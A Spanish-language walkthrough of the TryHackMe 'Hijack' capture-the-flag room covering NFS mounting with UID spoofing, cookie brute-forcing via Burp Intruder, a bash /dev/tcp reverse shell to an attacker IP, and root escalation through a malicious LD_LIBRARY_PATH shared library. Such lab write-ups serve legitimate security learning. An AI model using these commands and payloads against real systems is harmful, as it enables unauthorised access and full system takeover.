---
title: "Hijack"
description: "Hijack"
pubDate: 2025-05-20
---

https://tryhackme.com/r/room/hijack

# Fase de reconocimiento

## Buscar puertos abiertos

````
nmap -sT -Pn -p- --open --min-rate 5000 -T5 -vvv -n 10.10.147.135 -oG allports
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240429211657.png)

## Reconocimiento de servicios

````
nmap -sCV -p21,22,80,111 10.10.147.135 -oN targeted
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240429211826.png)

## Comprobar el RPC

En nuesttro caso es un network file system

````
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.147.135
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240429221013.png)

Lo montamos en nuestro sistema

````
mount 10.10.147.135:/mnt/share /mnt/hijack
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240429222200.png)
Los permisos son de 1003

1. Creamos un usuario con ese UID y GIUD

````
groupadd -g 1003 hijacker
useradd -u 1003 -g 1003 hijacker
passwd hijacker
````

2. Nos conectamos con el ususario

````
su hijacker
````

3. Cuando listamos el directorio contiene un archivo
   Este archivo contiene las credenciales FTP
   ![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240429222800.png)

## Gobuster

````
gobuster dir -u http://10.10.147.135 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240429213924.png)

# Fase de ataque

## FTP

Nos conectamos con las credenciales dadas
Encontramos un fichero

````
ftp> ls -la
````

Los ficheros contienen un aviso de admin de que el otro fichero son contraseñas para su uso.

## Burpsuite

Podemos observar que en el login de la web, si el usuario no existe te lo reporta.
Vemos que el usuario ADMIN si existe

1. Con Burpsuite capturamos la petición
1. Vemos que podemos modificar la cookie y que la cookie concide con la contraseña y usuario
1. Hasheamos la contraseña

````
for i in $(cat passwords.txt); do echo -n "$i" | md5sum | tr -d " -" >>hash.txt; done
````

4. URLencondeamos la contraseña

````
for i in $(cat hash.txt); do echo -n "admin:$i" | base64 | tr -d " -" >> passwrdcode.txt; done
````

5. Cargamos el intruder con las Cookies creadas
   ![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240429233349.png)
   ![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240429233402.png)
   Enontramos la Cookie del Admin
5. Modificamos la Cookie en el navegador
   ![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240429233626.png)

## Entramos al panel

1. Lanzamos el la Reverse shell

````
sshd && bash -c 'bash -i >& /dev/tcp/10.9.2.97/1111 0>&1'
````

3. Nos ponemos en escucha por el puerto 443 para recibir la Shell

````
nc -nlvp 1111
````

\[-\] ==pwned!==

## Ajustar terminal

````
script /dev/null -c bash
````

ctrl + z

````
stty raw -echo; fg
````

````
	reset xterm
````

````
export TERM=xterm
````

Ajustar proporciones

````
stty rows 44 columns 184
````

# Privilege Escalation

Dentro de config.php está el usuario y contraseña de un usuario
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240429235529.png)
Nos conectamos
Podemos ejecutar el siguiente comando con contraseña para saber que comandos con privilegioss puede utilizar el usuario

````
sudo -l
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240429235602.png)

## LD_LIBRARY_PATH

1. Creamos un programa en C en /tmp que lanza una terminal root

````
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
````

2. Compilamos

````
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/shell.c
````

3. Ejecutamos el shell con el comando con privilegios

````
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
````

\[+\] ==pwned!==
